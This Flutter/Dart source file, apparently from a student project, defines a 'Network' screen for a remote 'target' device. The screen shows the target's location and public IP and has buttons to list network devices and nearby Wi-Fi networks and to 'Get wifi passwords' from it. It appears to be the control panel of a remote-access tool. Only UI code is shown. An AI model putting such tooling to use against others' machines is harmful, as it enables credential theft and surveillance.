import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:inferno_core_fyp/res/constants.dart';
import 'package:inferno_core_fyp/res/helper_extensions.dart';
import 'package:inferno_core_fyp/res/widgets/button%20components/my_text_btn.dart';

import '../../res/widgets/general widgets/dotted_strings.dart';
import '../../res/widgets/general widgets/my_text.dart';
import '../../view models/controllers/general_controller.dart';

class Network extends StatefulWidget {
  final String targetId;

  const Network({super.key, required this.targetId});

  @override
  State<Network> createState() => _NetworkState();
}

class _NetworkState extends State<Network> {
  GeneralController generalController = Get.put(GeneralController());

  @override
  void initState() {
    if(generalController.country.value == '') {
      generalController.getNetworkInfo(widget.targetId);
    }
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("Network"), centerTitle: true),
      body: Padding(
        padding: const EdgeInsets.all(kDefaultPadding),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Center(
              child: Container(
                padding: const EdgeInsets.all(10),
                width: Get.width / 1.27,
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(7),
                  border: Border.all(color: whiteColor, width: 2),
                ),
                child: Obx(
                  () => Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      dotsSeparatedStrings(
                          t1: "Country ", t2: generalController.country.value),
                      dotsSeparatedStrings(
                          t1: "City ", t2: generalController.city.value),
                      dotsSeparatedStrings(
                          t1: "IP", t2: generalController.publicIP.value),
                    ],
                  ),
                ),
              ),
            ),
            20.ph,
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                MyTextButton(
                  text: "Available\ndevices",
                  onPressed: () {
                    generalController.getAvailableDevices(widget.targetId);
                  },
                  height: 57,
                ),
                MyTextButton(
                  text: "Get wifi\npasswords",
                  onPressed: () {
                    generalController.getWifiPasswords(widget.targetId);
                  },
                  height: 57,
                ),
                MyTextButton(
                  text: "Get wifi\nnetworks",
                  onPressed: () {
                    generalController.getWifiNetworks(widget.targetId);
                  },
                  height: 57,
                ),
              ],
            ),
            20.ph,
            Expanded(
              child: Container(
                width: double.infinity,
                constraints: BoxConstraints(maxHeight: Get.height * 0.45),
                child: SingleChildScrollView(
                  child: Obx(
                    () {
                      if (generalController.showInTable.value == 'passwords') {
                        final passwordData = generalController.networkData;
                        if (passwordData.isEmpty) {
                          return const Text('No passwords available');
                        } else {
                          return BuildTable(
                            col1Name: "WiFi",
                            col2Name: "Password",
                            networkData: passwordData,
                          );
                        }
                      } else if (generalController.showInTable.value ==
                          'availableDevices') {
                        final networkData = generalController.networkData;
                        if (networkData.isEmpty) {
                          return const Text('No devices available');
                        } else {
                          return BuildTable(
                            col1Name: "IP",
                            col2Name: "Mac",
                            networkData: networkData,
                          );
                        }
                      } else {
                        final networkData = generalController.networkData;
                        if (networkData.isEmpty) {
                          return const Center(child: MyText('No data to show', fontSize: 16));
                        } else {
                          return BuildTable(
                            col1Name: "Name",
                            col2Name: "Security",
                            networkData: networkData,
                          );
                        }
                      }
                    },
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class BuildTable extends StatelessWidget {
  const BuildTable({
    super.key,
    required this.col1Name,
    required this.col2Name,
    required this.networkData,
  });

  final String col1Name, col2Name;
  final RxList<DataRow> networkData;

  @override
  Widget build(BuildContext context) {
    return DataTable(
      border: TableBorder.all(color: Colors.white),
      columnSpacing: 30,
      columns: [
        DataColumn(
          label: MyText(
            col1Name,
            fontWeight: FontWeight.bold,
            fontSize: 16,
          ),
        ),
        DataColumn(
          label: MyText(
            col2Name,
            fontWeight: FontWeight.bold,
            fontSize: 16,
          ),
        ),
      ],
      rows: networkData,
    );
  }
}
